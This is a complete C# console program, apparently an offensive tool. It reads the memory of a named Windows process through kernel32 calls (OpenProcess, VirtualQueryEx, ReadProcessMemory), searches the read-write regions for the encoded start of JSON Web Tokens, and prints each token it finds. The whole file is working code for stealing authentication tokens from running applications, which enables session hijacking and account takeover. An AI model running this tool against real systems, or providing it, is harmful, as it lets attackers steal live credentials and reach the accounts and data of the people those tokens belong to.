using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace MicrosoftJSONWebTokenExtractor
{
    class Program
    {
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int MEM_COMMIT = 0x00001000;
        const int PAGE_READWRITE = 0x04;
        const int PROCESS_WM_READ = 0x0010;

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(int hProcess, Int64 lpBaseAddress, byte[] lpBuffer, Int64 dwSize, ref Int64 lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION64 lpBuffer, uint dwLength);

        [DllImport("kernel32.dll")]
        internal static extern void GetNativeSystemInfo(ref SYSTEM_INFO lpSystemInfo);

        public struct MEMORY_BASIC_INFORMATION64
        {
            public ulong BaseAddress;
            public ulong AllocationBase;
            public int AllocationProtect;
            public int __alignment1;
            public ulong RegionSize;
            public int State;
            public int Protect;
            public int Type;
            public int __alignment2;
        }
        internal struct SYSTEM_INFO
        {
            public ushort wProcessorArchitecture;
            public ushort wReserved;
            public uint dwPageSize;
            public IntPtr lpMinimumApplicationAddress;
            public IntPtr lpMaximumApplicationAddress;
            public UIntPtr dwActiveProcessorMask;
            public uint dwNumberOfProcessors;
            public uint dwProcessorType;
            public uint dwAllocationGranularity;
            public ushort wProcessorLevel;
            public ushort wProcessorRevision;
        };
        public static string search = "eyJ0eXAiOiJKV1QiL";
        static public List<int> SearchBytePattern(byte[] pattern, byte[] bytes)
        {
            List<int> positions = new();
            int patternLength = pattern.Length;
            int totalLength = bytes.Length;
            byte firstMatchByte = pattern[0];
            for (int i = 0; i < totalLength; i++)
            {
                if (firstMatchByte == bytes[i] && totalLength - i >= patternLength)
                {
                    byte[] match = new byte[patternLength];
                    Array.Copy(bytes, i, match, 0, patternLength);
                    if (match.SequenceEqual<byte>(pattern))
                    {
                        positions.Add(i);
                        i += patternLength - 1;
                    }
                }
            }
            return positions;
        }
        static int ExtractJSONWebTokens(string processName)
        {
            Console.WriteLine("Trying to extract JSON Web Token from process: {0}", processName);
            SYSTEM_INFO sysInfo = new();
            GetNativeSystemInfo(ref sysInfo);

            IntPtr proc_min_address = sysInfo.lpMinimumApplicationAddress;
            IntPtr proc_max_address = sysInfo.lpMaximumApplicationAddress;
            long proc_min_address_l = (long)proc_min_address;
            long proc_max_address_l = (long)proc_max_address;

            Process process = Process.GetProcessesByName(processName)[0];

            IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, process.Id);

            _ = new MEMORY_BASIC_INFORMATION64();

            Int64 bytesRead = 0;

            while (proc_min_address_l < proc_max_address_l)
            {
                _ = VirtualQueryEx(processHandle, proc_min_address, out MEMORY_BASIC_INFORMATION64 mem_basic_info, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION64)));
                if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                {
                    byte[] buffer = new byte[mem_basic_info.RegionSize];
                    ReadProcessMemory((int)processHandle, (Int64)mem_basic_info.BaseAddress, buffer, (Int64)mem_basic_info.RegionSize, ref bytesRead);

                    byte[] pattern = new byte[] { 101, 0, 121, 0, 74, 0, 48, 0, 101, 0, 88, 0, 65, 0, 105, 0, 79, 0, 105, 0, 74, 0, 75, 0, 86, 0, 49, 0, 81, 0, 105, 0, 76, 0 };

                    if (Encoding.Unicode.GetString(buffer).Contains(search))
                    {
                        List<int> positions = SearchBytePattern(pattern, buffer);

                        foreach (var item in positions)
                        {
                            Console.WriteLine("JSON Web Token found at memory address {0} for process {1}", item, processName);
                            byte[] source = buffer;
                            byte[] byteSection = new byte[4096];
                            Buffer.BlockCopy(source, item, byteSection, 0, byteSection.Length);
                            var JWT = System.Text.Encoding.Unicode.GetString(byteSection);
                            var regex = new Regex("[^-A-Za-z0-9+/=._]|=[^=]|={3,}$");
                            var match = regex.Match(JWT);
                            string ValidJWT = JWT.ToString().Substring(0, match.Index);
                            Console.WriteLine(ValidJWT);
                            Console.WriteLine("");
                        }
                    }
                }
                proc_min_address_l += (Int64)mem_basic_info.RegionSize;
                proc_min_address = new IntPtr(proc_min_address_l);
            }
            return 0;
        }
        static void Help()
        {
            Console.WriteLine("Please specify the process name to check for JSON Web Tokens...");
            Console.WriteLine("");
            Console.WriteLine("Example: MicrosoftJSONWebTokenExtractor.exe /process:<name>");
            System.Environment.Exit(1);
        }
        static int Main(string[] args)
        {
            if (args.Length == 0 | args.Length > 1)
            {
                Help();
            }
            String argument = args[0].ToString().ToLower();
            if (argument.StartsWith("/process:"))
            {
                try
                {
                    String process = argument.Remove(0, 9);
                    ExtractJSONWebTokens(process);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    return 1;
                }
            }
            else
            {
                Help();
            }
            return 0;
        }
    }
}
